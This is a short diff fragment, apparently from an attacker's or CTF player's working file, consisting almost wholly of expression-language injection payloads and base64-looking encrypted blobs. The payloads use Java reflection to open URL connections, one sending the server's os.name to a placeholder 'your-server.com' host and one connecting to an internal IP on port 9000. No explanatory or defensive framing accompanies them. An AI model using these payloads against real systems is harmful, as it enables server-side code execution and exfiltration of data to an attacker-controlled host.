@@ -157,3 +157,6 @@ uMKljPgnOTVxmOB+H6/QEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVbBkVHj5xLXXCaFGp
 "${\"\".getClass().forName(\"java.net.URL\").getConstructor(\"\".getClass()).newInstance(\"http://your-server.com/?data=\"+\"\".getClass().forName(\"java.lang.System\").getMethod(\"getProperty\", \"\".getClass()).invoke(null, \"os.name\")).openStream()}"
 sVElCvCKCBaHjKKuVSyfMxoODmSSVScmg9P3b9aDezJ2HOW3hwifihvUlWVwq3wOGsx9CBmbufLUV27KM8P1AdeZQLxEx3fngPyQiDLCwZ7M61uais+hEioVxjYVD/98aonmLgeHSLRNjbsUKD9wR5j2A+F1v1ysLNyYgpnCdSbVNlWtLKL8TltYFry4ZvnGXTL8nJPHv9/WGal0pKQ+j5GVeV8PN/l9NnO0gG4VCSixQdYv39Zr4Oej23hyXYeSW0Gc+jlhQte8rLqPU8UssDUzmE6FIbw6zPF16lCYwJ/ArOk9w+65+uBZ/wDVUWzS
 
+
+payload = encrypt("${\"\".getClass().forName(\"java.net.HttpURLConnection\").cast(\"\".getClass().forName(\"java.net.URL\").getConstructor(\"\".getClass()).newInstance(\"http://10.128.148.19:9000/?data=test\")).openConnection()).connect()}")
+sVElCvCKCBaHjKKuVSyfMxoODmSSVScmg9P3b9aDezJcRC2f8MxWLouRpet+F3WrIMAAT4UFLJ7LvLjRm9Bb8Lb9VeG0Dh+aYk/NslObAogGqYEDFNEsGkn/6OcwVCl+ak/scMcQsHUN3U2rwNZFCEwPMzKUHzP4hh+DPmkai56Jr+S9Ix/38yF6N2TZUnzHodDH7D61Q2eOuMRRiXV0Hg8dTc9mOH+Fxlw3WsOeew0TaBMMYpcBXMdNWFLUXiyQ8IE0arnLB5TnHMsC02F1g+FCH448yuHH
